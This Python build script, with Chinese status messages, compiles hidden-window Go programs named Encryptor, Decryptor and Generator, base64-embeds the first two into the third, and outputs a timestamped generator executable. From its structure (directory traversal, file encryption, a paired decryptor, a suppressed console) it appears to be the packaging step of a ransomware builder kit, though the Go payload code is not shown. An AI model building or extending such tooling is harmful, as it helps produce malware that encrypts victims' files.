import base64
import pyperclip as cb
import os
import datetime

Encryptor_Generate_Cmd = 'go build -ldflags "-H=windowsgui" .\\main.go .\\file.go .\\encrypt.go .\\dirOpera.go .\\constVar.go .\\linkedVar.go'
Decryptor_Generate_Cmd = 'go build -ldflags "-H=windowsgui" .\\main.go .\\linkedVar.go .\\encrypt.go .\\dirOperaDecryptor.go .\\file.go .\\constVar.go'
Generator_Generate_Cmd = 'go build -ldflags "-H=windowsgui" .\\main.go .\\constVar.go .\\random.go .\\generate.go .\\file.go .\\encrypt.go .\\program_binary.go'

print("----------------生成加密器中----------------")
os.chdir("../Encryptor")
os.system(Encryptor_Generate_Cmd)
with open('main.exe', 'rb') as f:
    Encryptor_Base64 = base64.b64encode(f.read()).decode()
os.system('''del main.exe''')

print("----------------生成解密器中----------------")
os.chdir("../Decryptor")
os.system(Decryptor_Generate_Cmd)
with open('main.exe', 'rb') as f:
    Decryptor_Base64 = base64.b64encode(f.read()).decode()
os.system('''del main.exe''')

print("----------------生成进Generator中----------------")
os.chdir("../Generator")
with open("program_binary.go", "w") as f:
    f.write(f'''package main

//gofmt: off
var GENE_TIME = "{ str(datetime.datetime.now())[:22] }"

//gofmt: off
var ENCRYPTOR_BASE64_MODEL = "{ Encryptor_Base64 }"

//gofmt: off
var DECRYPTOR_BASE64_MODEL = "{ Decryptor_Base64 }"
''')
os.system(Generator_Generate_Cmd)
os.rename('./main.exe', f'../生成器_{str(datetime.datetime.now())[:22].replace(":", ".")}.exe')